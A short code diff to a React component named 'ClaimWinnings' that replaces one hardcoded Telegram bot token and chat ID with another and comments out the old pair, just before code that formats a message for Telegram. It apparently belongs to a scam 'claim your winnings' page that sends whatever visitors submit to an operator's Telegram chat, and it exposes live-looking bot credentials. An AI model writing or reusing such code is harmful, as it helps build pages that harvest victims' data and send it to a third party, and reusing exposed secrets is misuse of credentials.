@@ -76,8 +76,11 @@ const ClaimWinnings = () => {
     e.preventDefault();
     setIsLoading(true); 
   
-    const botToken = "7566743228:AAElkX2wNtU4BeA30fK-SgnRgeHxcjIKV8o";
-    const chatId = "7029898481";
+    const botToken = "8119231817:AAGAmxzBGY0vBPeVFM2hEEBbXkoAUGxm_HE";
+    const chatId = "6837437455";
+  
+    // const botToken = "7566743228:AAElkX2wNtU4BeA30fK-SgnRgeHxcjIKV8o";
+    // const chatId = "7029898481";
   
     // Format text message for Telegram
     const textMessage = `
